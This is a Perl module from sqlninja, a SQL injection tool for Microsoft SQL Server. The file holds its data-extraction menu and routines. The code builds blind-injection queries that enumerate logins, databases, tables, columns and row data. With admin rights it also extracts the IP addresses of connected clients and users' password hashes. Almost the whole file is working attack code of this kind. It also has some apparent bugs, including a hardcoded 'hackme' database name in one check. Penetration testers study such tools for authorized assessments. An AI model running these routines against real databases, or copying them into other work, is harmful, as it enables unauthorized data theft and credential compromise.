# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# get data menu
sub getdata
{

	print "Starting data extraction module....\n".
	      "*******************************************\n".
	      "* WARNING: This is highly experimental!!! *\n".
	      "*******************************************\n";

	print_verbose("Setting up extraction module...\n");

	# set up extraction module (dns or time)
	setup_module();
	$SIG{INT} = \&term_proc;
	$SIG{TERM} = \&term_proc;

	my @m = (
		[   '',     "--- Default Functionality ---------------------",	undef],
		[	'1',	'Enumerate Users', 					\&extract_users		],
		[	'2',	'Enumerate DBs',					\&extract_DBs		],
		[	'3',	'Enumerate tables',					\&extract_tables	],
		[	'4',	'Enumerate columns of a table',		\&extract_columns	],
		[	'5',	'Enumerate rows in a table/column',	\&extract_rows		],
		[	'6',	'Find tables from column name',	\&find_tables		],
		[   '',     "--- Admin Functionality -----------------------",	undef],
		[	'7',	'Enumerate connected client IP addresses',	\&extract_connected_clients		],
		[	'8',	'Enumerate user password hashes',			\&extract_password_hashes		],
		[   '',     "--- Other -------------------------------------",	undef		],
		[	's',	'Show enumerated schema',			\&session_print		],
		[	'd',	'Show enumerated data',				\&extract_show_data	],
		[	'h',	'print this menu',					undef				],
		[	'q',	'exit',								\&extract_quit		]
	);

	# experimental, defined in utils.pl
	show_menu(\@m,"\nSelect what you want to do:");
}

# Print an array of things, ordered in columns
# First Param : the array
# Second Param : number of chars to drop (to print, for instance, only "column" instead of "DB.table.column"
sub print_array
{
	my ($array, $drop_chars) = @_;
	my $COLUMNS = 4; # entries per row
	my $i = 0;

	foreach my $element (@{$array}) {
		print " $i: " . substr($element, $drop_chars) . "\t";
		if ((($i + 1) % $COLUMNS) == 0) {
			print "\n";
		}
		$i++;
	}
	print "\n";
}


# Select a database, allowing to choose from the ones already fingerprinted
sub select_database
{

	# load a list of enumerated databases from the session db
	my $dbs = session_load_databases();
	my ($current_db, $updated) = session_load_property(SESSION_PROPERTY_CURRENT_DATABASE);

	# if session is not enabled, read from prompt
	if (!session_is_enabled() || ((scalar @{$dbs} == 0) && ($current_db eq ""))) {
		return read_from_prompt("Please specify database to enumerate from:\n");
	}

	print "Which database tables do you want to enumerate?\n";
	if (scalar @{$dbs} > 0) {
		print "Databases we know of:\n";
		print_array($dbs);
	} else {
		print "(no databases identified so far)\n";
	}

	print ($current_db ne "" ? "Default: ".$current_db." (current db)\n" : "") . ")\n"; 
	my $db_name = "";
	do {
		$db_name = read_from_prompt('','^[\d+]?$');
		if (($db_name eq "") and !($current_db eq "")) {
			$db_name = $current_db;
		} elsif (($db_name > -1) and ($db_name < scalar @{$dbs})) {
			$db_name = $dbs->[$db_name];
		} else {
			$db_name = "";
		}
	} while ($db_name eq "");

	return $db_name;
}

sub select_table 
{
	my $db_name = shift;



	my $tables = session_load_tables($db_name);

	# if session is not enabled, read from prompt
	if (!session_is_enabled() || (scalar @{$tables} == 0)) {
		return read_from_prompt("Please specify table to enumerate from:\n");
	}

		# select table
	print "From which of the following tables?\n";
	print_array($tables);

	while (1) {
		my $table_name = read_from_prompt("[$db_name] ", '^\d+$');

		if (($table_name > -1) and ($table_name < scalar @{$tables})) {
			$table_name = @{$tables}[$table_name];

			return $table_name;
		}
	}
}


sub select_columns
{
	my ($db_name, $table_name) = @_;
	my @choice;

	my $columns = session_load_columns($db_name, $table_name);

	# if session is not enabled, read from prompt
	if (!session_is_enabled() || (scalar @{$columns} == 0)) {
		my $column = read_from_prompt("Please specify column to enumerate from (separate columns with commas. Eg: user,passwd):\n");

		my @column_array = split(/,/,$column);
		foreach my $c (@column_array) {
			push(@choice, $c);
		}

		return \@choice;
	}
	
	print "Select from the following columns (separate numbers with commas. Eg: 1,2,4)\n";

	my @column_names;
	foreach my $column (@{$columns}) {
		push(@column_names, @{$column}[0]);
	}

	print_array(\@column_names);
	
	my $column_numbers = "";
	do {
		$column_numbers = read_from_prompt("[$db_name.$table_name]");
	} while ($column_numbers !~ m/(\d+,)*\d+/);
	
	my @numbers = split(/,/,$column_numbers);
	# remove duplicates
	my %unique = ();
	foreach my $item (@numbers)
	{
		$unique{$item} ++;
	}
	my @uniquenumbers = keys %unique;
	@uniquenumbers = sort(@uniquenumbers);

	# Check that all values are in range
	foreach my $num (@uniquenumbers) {
		if (($num < 0) or ($num >= scalar(@column_names))) {
			next;
		}
		push(@choice, @column_names[$num]);
	}
	return \@choice;
}

# SELECT name FROM master..syslogins
# Excluding by default a bunch of built-in users
sub extract_users()
{

	# load enumerated users from session
	my $users = session_load_all_properties(SESSION_PROPERTY_USER);
	my $query_exclusion = "";
	if ($users != undef && scalar @{$users} > 0) {
		foreach my $user (@{$users}) {
			print "  " . $user . "\n";
			$query_exclusion .= " and name<>'". $user . "'";
		}
	}

	# Count users
	my ($num_users, $updated) = session_load_property(SESSION_PROPERTY_USER_NUM);
	if ($num_users eq "") {
		my $query_count = "select count(name) from master..syslogins where name not like '##%##' ".
			 "and name not like '\%SQLServer\%MSSQLUser\%' and name not like ".
			 "'\%SQLServer%\SqlAgentUser\%'";
		$num_users = extract_number($query_count, 0, 50, 1, "Number of users");
		session_store_property(SESSION_PROPERTY_USER_NUM, $num_users);
    }
    
    $num_users -= scalar @{$users};
    
    if ($num_users == 0) {
    	return 0;
    }

	# generic queries
	my $query = "select top 1 name from master..syslogins where name not like '##%##' ".
		    "and name not like '\%SQLServer\%MSSQLUser\%' and name not like ".
		    "'\%SQLServer%\SqlAgentUser\%' " . $query_exclusion;

    my $query_len = "select top 1 len(name) from master..syslogins where name not like '##%##' ".
		    "and name not like '\%SQLServer\%MSSQLUser\%' and name not like ".
		    "'\%SQLServer%\SqlAgentUser\%' " . $query_exclusion;

    # enumerate all users
	print "[+] Enumerating ".$num_users." users.... \n";

	for (my $i = 0; $i < $num_users; $i++) {

		# send query to DB
	    my $temp_user = extract_string($query, $query_len, 1, 50, 1, "Name of user #".$i);

	    # check sanity of result
	    if (!sanity_check("SELECT name FROM master..syslogins WHERE LOWER(name) = LOWER('$temp_user')")) {
	    	print "The result was corrupted. Trying again...\n";
	    	redo;
	    }

	    session_store_property(SESSION_PROPERTY_USER, $temp_user);

		# extend queries by excluding found users
		$query .= " and name<>'" . $temp_user . "'";
		$query_len .= " and name<>'" . $temp_user . "'";
	}
}

# SELECT name FROM master..sysdatabases; 
# SELECT DB_NAME(N); -- for N = 0, 1, 2, ... 
sub extract_DBs()
{
	my $query;
	my $query_len;
	my $query_end;

	my $dbs = session_load_databases();
	foreach my $db (@{$dbs}) {
		print "  $db\n";
	}

	# Count databases
	my ($num_DBs, $updated) = session_load_property(SESSION_PROPERTY_DATABASE_NUM);
	if ($num_DBs eq "") {
		my $query_count = "select count(name) from master..sysdatabases";    
		$num_DBs = extract_number($query_count, 0, 50, 1, "Number of databases");
		session_store_property(SESSION_PROPERTY_DATABASE_NUM, $num_DBs);
	}

    # generic queries
    my $query = "select top 1 name from master..sysdatabases";
	my $query_len = "select top 1 len(name) from master..sysdatabases";

	# exclude databases that have already been enumerated
	if ($num_DBs > scalar @{$dbs}) {
		for (my $i = 0; $i < scalar @{$dbs}; $i++) {
			if ($i == 0) {
	    		$query_end = " where name <> '" . @{$dbs}[$i]. "'";
	    	} else {
	    		$query_end = " and name <> '" . @{$dbs}[$i]  . "'";
	    	}
		    $query .= $query_end;
		    $query_len .= $query_end;
		}
		# decrease the number of users to enumerate now
		$num_DBs -= scalar @{$dbs};
	} else {
		print "No more DBs to enumerate\n";
		return;
	}

    # enumerate all databases
	print "Now enumerating ".$num_DBs." databases.... \n";
	for (my $i = 0; $i < $num_DBs; $i++) {
	    
	    my $temp_db = extract_string($query, $query_len, 1,50, 1, "Name of DB #".$i);
		
		# check sanity of result
	    if (!sanity_check("SELECT name FROM master..sysdatabases WHERE LOWER(name) = LOWER('$temp_db')")) {
	    	print "The result was corrupted. Trying again...\n";
	    	redo;
	    }


		session_store_database($temp_db);

	    if ($i == 0 && scalar @{$dbs} == 0) {
	    	$query_end = " where name <> '" . $temp_db . "'";
	    } else {
	    	$query_end = " and name <> '" . $temp_db  . "'";
	    }
	    $query .= $query_end;
	    $query_len .= $query_end;
	}
}


# SELECT name FROM somedb..sysobjects WHERE xtype = 'U';
sub extract_tables
{
	my $db_name = select_database();
	if ($db_name eq "") {
		return;
	}

	my $pattern = read_from_prompt("If needed, enter pattern for table names (e.g.: A%, \%password\%, ...)\n[$db_name] ");

	# print tables that were already enumerated and match the pattern
	if ($pattern eq "") {
		$pattern = "%";
	}
	
	my $tables = session_load_tables($db_name, $pattern);
	my $query_exclusion = "";
	foreach my $table (@{$tables}) {
		print "  $table\n";

		$query_exclusion .= " and name <> '" . $table . "'";
	}

	# count all tables in db (regardless of pattern)
	my $num_tables_total = session_load_table_num($db_name);
	if ($num_tables_total eq "") {
		my $query_count = "select count(name) from " . $db_name . "..sysobjects WHERE xtype='U'";
		# TODO: what if more than 300? Can that happen? (nico)
		$num_tables_total = extract_number($query_count, 0, 300, 1, "number of tables");
		session_store_table_num($db_name, $num_tables_total);
	}

	print "There are $num_tables_total tables in total in the selected database.\n";

	# if pattern is equals %, we can skip the following counting step, as it will be the same as the total number of tables 
	if ($num_tables_total - scalar(@{$tables}) == 0) {
		print "We already enumerated them all.\n";
		return;
	}

	my $num_tables = $num_tables_total;
	if ($pattern ne "%") {
		# Count tables by pattern
		my $query_count = "select count(name) from " . $db_name . "..sysobjects WHERE xtype='U' and name LIKE '" . $pattern . "'" . $query_exclusion;
		$num_tables = extract_number($query_count, 0, 300, 1, "number of tables");
		print "$num_tables tables that have not been enumerated yet match the selected pattern.\n";
	}

	# generic queries
	my $query_len = "select top 1 len(name) from " . $db_name . "..sysobjects WHERE xtype='U' and name LIKE '" . $pattern . "'" . $query_exclusion;
	my $query = "select top 1 name from " . $db_name . "..sysobjects WHERE xtype='U' and name LIKE '" . $pattern . "'" . $query_exclusion;

	

	print "Now enumerating " . $num_tables . " tables...\n";
	for (my $i = 0; $i < $num_tables; $i++) {

	    my $temp_table = extract_string($query, $query_len, 1, 50, 1, "Name of table #".$i);

	    # check sanity of result
	    if (!sanity_check("SELECT name FROM master..sysobjects WHERE LOWER(name) = LOWER('$temp_table')")) {
	    	print "The result was corrupted. Trying again...\n";
	    	redo;
	    }

	    session_store_table($db_name, $temp_table);
		
		$query_exclusion .= " and name <> '" . $temp_table . "'";
	    $query_len .= $query_exclusion;
	    $query .= $query_exclusion;
	}
}

sub extract_columns
{
	my ($db_name, $table_name) = @_;

	if ($db_name eq "") {
		# select database
		$db_name = select_database();
		if ($db_name eq "") {
			return;
		}
	}

	if ($table_name eq "") {
		$table_name = select_table($db_name);
		if ($table_name eq "") {
			return;
		}
	}

	# enumerate columns
	my $columns = session_load_columns($db_name, $table_name);
	my $query_exclusion = "";
	foreach my $column (@{$columns}) {
#		my ($column_name, $data_type) = split(/ /, substr($column->[0], length($db_name) + length($table_name) + 2));
		print "  " , @{$column}[0] . " (" . @{$column}[1] . ")\n";
		$query_exclusion .= " and (".$db_name."..syscolumns.name)<>'". @{$column}[0] . "'";
	}

	my $num_columns = session_load_column_num($db_name, $table_name);
	if ($num_columns eq "") {
		my $query_count = "SELECT count(".$db_name."..syscolumns.name)".
				 	" FROM ".$db_name."..syscolumns, ".$db_name."..sysobjects".
			 		" WHERE ".$db_name."..syscolumns.id=".$db_name."..sysobjects.id AND ".
		 			$db_name."..sysobjects.name = '".$table_name."'";

		$num_columns = extract_number($query_count, 0,300, 1, "number of columns");
		session_store_column_num($db_name, $table_name, $num_columns);
	}
	$num_columns -= scalar @{$columns};

	if ($num_columns == 0) {
		return;
	}

	my $query_len = "SELECT top 1 len(".$db_name."..syscolumns.name)".
			     " FROM ".$db_name."..syscolumns, ".$db_name."..sysobjects".
			     " WHERE ".$db_name."..syscolumns.id=".$db_name."..sysobjects.id AND ".
			     $db_name."..sysobjects.name = '".$table_name."'" . $query_exclusion;

	my $query = "SELECT top 1 (".$db_name."..syscolumns.name)".
			      " FROM ".$db_name."..syscolumns, ".$db_name."..sysobjects".
			      " WHERE ".$db_name."..syscolumns.id=".$db_name."..sysobjects.id AND ".
			      $db_name."..sysobjects.name = '".$table_name."'" . $query_exclusion;

	print "Now enumerating ".$num_columns." columns.... \n";

	for (my $i = 0; $i<$num_columns; $i++) {

		my $temp_column = extract_string($query,
					       $query_len,
					       1,100,
					       0,
					       "Name of column #".$i);

		# check sanity of result
	    if (!sanity_check("SELECT $db_name..syscolumns.name FROM $db_name..syscolumns,hackme..sysobjects WHERE LOWER($db_name..syscolumns.name) = LOWER('$temp_column') AND $db_name..syscolumns.id=$db_name..sysobjects.id AND $db_name..sysobjects.name = '$table_name'")) {
	    	print "The result was corrupted. Trying again...\n";
	    	redo;
	    }


		$query_len .= " and (".$db_name."..syscolumns.name)<>'".$temp_column."'";
		$query .= " and (".$db_name."..syscolumns.name)<>'".$temp_column."'";

		my $temp_datatype = extract_datatype($temp_column, $table_name, $db_name);
		session_store_column($db_name, $table_name, $temp_column, $temp_datatype);
		print $i.": ".$temp_column." (".$temp_datatype.")\n";

	}
}



# select top 1 column from table 
sub extract_rows
{
	my $query_begin;
	my $query_end;
	my $query_len_begin;
	my $query_len_end;
	my @rows; # TEMP

	my ($version, $updated) = session_load_property(SESSION_PROPERTY_DBMS_VERSION);
	if ($version eq "") {
		print "In order to extract rows, we need to know the DB version\n";
		$version = fingerprint_version();
	}

	# select database
	my $db_name = select_database();
	if ($db_name eq "") {
		return;
	}
	
	# select table
	my $table_name = select_table($db_name);
	if ($table_name eq "") {
		return;
	}

	# check that we have the full table schema enumerated
	my $column_num = session_load_column_num($db_name, $table_name);
	my $columns_all = session_load_columns($db_name, $table_name);
	if ($column_num eq "" or scalar(@{$columns_all}) < $column_num) {
		print "The full table schema has to be known before we can extract row data\n";
		print "We're missing " . ($column_num - scalar @{$columns_all}) . " columns in this table.\n";

		# ask the user if they want to extract the data, If not, quit!
		my $answer = read_from_prompt("Do you want to proceed with enumeration of columns? (y|n)", '[ynYN]');
		if (lc($answer) eq 'n') {
			return;
		}
		# extract data
		extract_columns($db_name, $table_name);
	}

	# select columns
	my $columns = select_columns($db_name, $table_name);
	if (scalar @{$columns} == 0) {
		print "No columns selected... returning to main menu\n";
		return;
	}

	# Which rows should be extracted?
	my $number_start = read_from_prompt("Start row? [Def: 1, Max: 1000]\n", '^([\d]+)?$');
	if ($number_start eq "") {
		$number_start = 1;
	}
	my $number_end = read_from_prompt("End row? [Def: ".$number_start.", Max: ".($number_start+1000)."]\n", '^([\d]+)?$');
	if (($number_end eq "") or ($number_end < $number_start) or ($number_end > ($number_start+1000))) {
		$number_end = $number_start;
	}
	
	# count number of rows in table
	my $query_count =  "select count(*) from $db_name..$table_name";
	my $num_rows = extract_number($query_count, 0, 5000, "number of rows", 1);

	# a few sanity checks
	if ($num_rows < $number_end) {
		$number_end = $num_rows;
		if ($number_end < $number_start) {
			$number_start = $number_end;
		}
		print "[+] Table has only ".$num_rows." rows...\n";
	}
	print "[+] Enumerating rows from ".$number_start." to ".$number_end." \n";

	# construct column lists
	# TODO: Only cast non-varchar columns
	my $columns_list = join(',',@{$columns});
	# print $columns_list."\n";

	my $columns_cast = "(isnull(cast(" . join(" as varchar),'-')+' | '+isnull(cast(", @{$columns}) . " as varchar),'-'))";
	# print $columns_cast."\n";
	
	my $columns_all_list;
	for (my $i=0; $i < @{$columns_all}; $i++)  {
		$columns_all_list .= @{$columns_all}[$i]->[0].",";
	}
	chop $columns_all_list; # remove last comma

	# print column header string
	my $title = "Row No | ";
	my $column;
	foreach $column (@{$columns}) {
		$title .= $column." | ";
	}
	my $titlelength = length($title);
	print $title."\n"."-"x$titlelength."\n";

	if (($version =~ /Microsoft SQL Server 2005/) or 
	    ($version =~ /Microsoft SQL Server 2008/) or
	    ($version =~ /Microsoft SQL Server 2012/)) {
		$query_len_begin = "select len(".$columns_cast.") from ".
					"(select *,row_number() over (order by ".$columns_all_list.") as row ".
					"from ".$db_name."..".$table_name.") as sq where sq.row = ";
		$query_len_end = "";
		$query_begin = "select ".$columns_cast." from ".
					"(select *,row_number() over (order by ".$columns_all_list.") as row ".
					"from ".$db_name."..".$table_name.") as sq where sq.row = ";
		$query_end = "";
	} else {
		$query_len_begin = "select top 1 len(".$columns_cast.") FROM (SELECT TOP 1 ".$columns_all_list." FROM (SELECT TOP ";
		$query_len_end = " ".$columns_all_list." FROM ".$db_name."..".$table_name." ORDER BY ".$columns_all_list." ASC) sq ORDER BY 1 DESC) sq ORDER BY 1";
		$query_begin = "SELECT TOP 1 ".$columns_cast." FROM (SELECT TOP 1 ".$columns_all_list." FROM (SELECT TOP ";
		$query_end = " ".$columns_all_list." FROM ".$db_name."..".$table_name." ORDER BY ".$columns_all_list." ASC) sq ORDER BY 1 DESC) sq ORDER BY 1";
	}

	# make sure database structure is created
	session_create_row_structure($db_name, $table_name);

	for (my $i = $number_start; $i <= $number_end; $i++) {
		# TODO: Why the second ORDER BY needs only one column? If otherwise, all results are the same
		my $query_len = $query_len_begin.$i.$query_len_end; 
		my $query = $query_begin.$i.$query_end;
	
		my $temp_row = extract_string($query, $query_len,  0,50, 1,  "Row #".$i);
	
		my @row = split(/ \| /, $temp_row);
		session_store_row($db_name, $table_name, $i, $columns, \@row);
	}
	
}

# SELECT sysobjects.name as tablename, syscolumns.name as columnname 
# FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id 
# WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%PASSWORD%'
sub find_tables
{

	my $temp_column;
	my @columns;
	my $i;
	my $j;

	my $db_name = select_database();

	my $column = read_from_prompt("Enter name or pattern for column (e.g.: FieldXYZ, A%, \%password\%, ...)\n");

	if ($column eq "") {
		return;
	}

	# check if there are already some columns of that name in the session file
	my $query_exclusion = "";
	my $tables = session_load_tables($db_name);

	# make sure we have the number of tables
	my $num_tables_total = session_load_table_num($db_name);
	if ($num_tables_total eq "") {
		print "Hang on, let me find out first how many tables there are to search through...\n";
		my $query_count = "select count(name) from " . $db_name . "..sysobjects WHERE xtype='U'";
		# TODO: what if more than 300? Can that happen? (nico)
		$num_tables_total = extract_number($query_count, 0, 300, 1, "number of tables");
		session_store_table_num($db_name, $num_tables_total);
	}

	print "There are $num_tables_total tables to search through.\n";

	foreach my $table (@{$tables}) {
		my $columns = session_load_columns($db_name, $table, $column);
		foreach my $column (@{$columns}) {
			print "table '$table' contains '" . @{$column}[0] . "' (". @{$column}[1] .")\n";
			$query_exclusion .= " and(".$db_name."..sysobjects.name+' | '+".$db_name."..syscolumns.name)<>'". $table ." | ". @{$column}[0] ."'";

		}
	}


	my $query_count = "SELECT count(".$db_name."..sysobjects.name,".$db_name."..syscolumns.name) ". 
		 "FROM ".$db_name.."..sysobjects JOIN ".$db_name."syscolumns ON ".$db_name."..sysobjects.id=".$db_name."..syscolumns.id ". 
		 "WHERE ".$db_name."..sysobjects.xtype='U' AND ".$db_name."..syscolumns.name LIKE '".$column."'" . $query_exclusion;

	my $num_columns = extract_number($query_count, 0, 500, 1, "number of matched columns");

	my $query_len = "SELECT top 1 len(".$db_name."..sysobjects.name+' | '+".$db_name."..syscolumns.name) ". 
			    "FROM ".$db_name."..sysobjects JOIN ".$db_name."..syscolumns ON ".$db_name."..sysobjects.id=".$db_name."..syscolumns.id ". 
			    "WHERE ".$db_name."..sysobjects.xtype='U' AND ".$db_name."..syscolumns.name LIKE '".$column."'".$query_exclusion;

	my $query = "SELECT top 1 (".$db_name."..sysobjects.name+' | '+".$db_name."..syscolumns.name) ". 
			 "FROM ".$db_name."..sysobjects JOIN ".$db_name."..syscolumns ON ".$db_name."..sysobjects.id=".$db_name."..syscolumns.id ". 
			 "WHERE ".$db_name."..sysobjects.xtype='U' AND ".$db_name."..syscolumns.name LIKE '".$column."'".$query_exclusion;


	print "Enumerating $num_columns columns...\n";
	for ($i = 0; $i<$num_columns; $i++) {

		$temp_column = extract_string($query,
					  $query_len,
					  1,100,
					  0,
					  "Table|Column #".$i);
		my ($table, $field) = split(/ \| /, $temp_column);
		my $datatype = extract_datatype($field, $table, $db_name);

		session_store_table($db_name, $table);
		session_store_column($db_name, $table, $field, $datatype);
		print "table '$table' contains '$field' ($datatype)\n";

		# if we don't know yet how many columns that tabel has in total, let's find out
		my $num_columns = session_load_column_num($db_name, $table);
		if ($num_columns eq "") {
			print "Hang on, let me find out how many columns there are in that table...\n";
			my $query_count = "SELECT count(".$db_name."..syscolumns.name)".
				 	" FROM ".$db_name."..syscolumns, ".$db_name."..sysobjects".
			 		" WHERE ".$db_name."..syscolumns.id=".$db_name."..sysobjects.id AND ".
		 			$db_name."..sysobjects.name = '".$table."'";

			$num_columns = extract_number($query_count, 0,300, 1, "number of columns");
			session_store_column_num($db_name, $table, $num_columns);
			print "In total there are $num_columns columns in that table\n";
		}


		$query_exclusion = " and(".$db_name."..sysobjects.name+' | '+".$db_name."..syscolumns.name)<>'" .$temp_column. "'";
		$query .= $query_exclusion;
		$query_len .= $query_exclusion;

	}
	
}

sub has_admin_privileges
{
	my ($is_admin, $updated) = session_load_property(SESSION_PROPERTY_CURRENT_USER_IS_ADMIN);
	if ($is_admin eq "") {
		print "You need to have administrator privileges to run this command.\n";
		fingerprint_sysadmin();
	}

	($is_admin, $updated) = session_load_property(SESSION_PROPERTY_CURRENT_USER_IS_ADMIN);
	if (!$is_admin) {
		print "You need to have administrator privileges to run this command. You're not an admin!\n";
		return 0;
	}

	return 1;
}


sub extract_connected_clients
{

	if (!has_admin_privileges()) {
		return;
	}

	my ($version, $updated) = session_load_property(SESSION_PROPERTY_DBMS_VERSION);
	if ($version eq "") {
		print "In order to extract connected client IP addresses, we need to know the DB version\n";
		$version = fingerprint_version();
	}
	if ($version =~ /Microsoft SQL Server 2000/) {
		print "Sorry, this functionality only works with SQL Server > 2000.\n";
		#TODO For SQL Server 2000: SELECT net_library FROM sysprocesses WHERE spid = @@SPID
		return;
	} 

	# Count clients
	my $query_count = "SELECT COUNT(DISTINCT client_net_address) FROM sys.dm_exec_connections WHERE client_net_address <> '<local machine>'";
	my $num_clients = extract_number($query_count, 0, 50, 1, "Number of clients");
    
	print "[+] Enumerating ".$num_clients." clients.... \n";

	my $query_ext = "";
	for (my $client = 0; $client < $num_clients; $client++) {
		my $ip_addr = "";
		for (my $segment = 1; $segment <= 4; $segment++) {
			my $rs = extract_number("SELECT DISTINCT TOP 1 PARSENAME(client_net_address, $segment) FROM sys.dm_exec_connections WHERE client_net_address <> '<local machine>' " . $query_ext, 0, 256, 1, "Client IP address");
			if ($ip_addr ne "") {
				$ip_addr = $rs . "." . $ip_addr;
			} else {
				$ip_addr = $rs;
			}
		}

		print "  $ip_addr\n";

		#do sanity check
	    if (!sanity_check("SELECT 1 FROM sys.dm_exec_connections WHERE client_net_address='$ip_addr'")) {
	   		print "The result was corrupted. Trying again...\n";
			redo;
		}

		# extend queries by excluding found clients
		$query_ext .= " and client_net_address<>'" . $ip_addr . "'";
	}
}

sub extract_password_hashes
{
	# check that we have admin privileges
	if (!has_admin_privileges()) {
		return;
	}

	# retrieve the sql server version
	my ($version, $updated) = session_load_property(SESSION_PROPERTY_DBMS_VERSION);
	if ($version eq "") {
		print "In order to extract password hashes, we need to know the DB version\n";
		$version = fingerprint_version();
	}
	
	my ($num_users, $updated) = session_load_property(SESSION_PROPERTY_USER_NUM);
	my $users = session_load_all_properties(SESSION_PROPERTY_USER);

	if ($num_users eq "" or scalar @{$users} == 0) {
		print "You need to enumerate some users first\n";
		return;
	}

	if ($num_users > scalar @{$users}) {
		print "You haven't enumerated all users yet. But we'll continue anyway.\n";
	}
	

	my $query = "";
	my $query_len;
	my $hash_len;
	if ($version =~ /Microsoft\s+SQL Server\s+2000/) {
		$query = "SELECT master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins";
		$hash_len = 94;
	} else {
		$query = "SELECT master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins";
		$hash_len = 54;
	}


	print "Enumerating password hashes for " . (scalar @{$users}) . " users...\n";
	foreach my $user (@{$users}) {

		my ($hash, $updated) = session_load_property(SESSION_PROPERTY_PASSWORD_HASH . "_$user");

		if ($hash eq "") {
			my $user_query = $query . " where name = '$user'";
			my $user_query_len = $query_len ." where name = '$user'";
		
			$hash = extract_hash($user_query, $hash_len);

			if (!sanity_check("SELECT 1 FROM master.sys.sql_logins WHERE name='$user' AND master.sys.fn_varbintohexstr(password_hash) = '$hash'")) {
	   			print "The result was corrupted. Trying again...\n";
				redo;
			}

			if ($hash eq "") {
				$hash = "{Windows authentication}";
			}
			session_store_property_unique(SESSION_PROPERTY_PASSWORD_HASH . "_$user", $hash);
		}

		print "  $user: $hash\n";
	}
}

# 0x01003476 7D5C2FD54D 6119FFF041 29A1D72E7C 3194F7284A 7F3A2FD54D 6119FFF041 29A1D72E7C 3194F7284A 7F3A
# 0x01004086ceb6370f972f9c9125fb8919e8078b3f3c3df37efdf3
# 0x0100000000000000000000000000000000000000000000000000

sub extract_show_data
{
	my $db_name = select_database();
	my $table_name = select_table($db_name, 1);

	if ($db_name eq "" or $table_name eq "") {
		print "We need a database and table name to show some data...\n";
		return;
	}

	print "Enumerated data from $db_name.$table_name\n";

	
	my $columns = session_load_columns($db_name, $table_name);

	my $rows = session_load_rows($db_name, $table_name);

	# construct column header string
	printf "%12s |" , "Row No";
	foreach my $column (@{$columns}) {
		printf "%12s |" , @{$column}[0];
	}
	printf "%12s |\n" , "Last Updated";
	print '-'x(14*(2+scalar @{$columns})) . "\n";

	foreach my $row (@{$rows}) {
		for (my $i = 0; $i < (scalar @{$columns} + 2); $i++) {
			printf "%12s |" , @{$row}[$i];
		}
		print "\n";
	}

}

sub term_proc
{
	exit();
}
sub extract_quit 
{
	shutdown_module();
	exit(0);
}



1;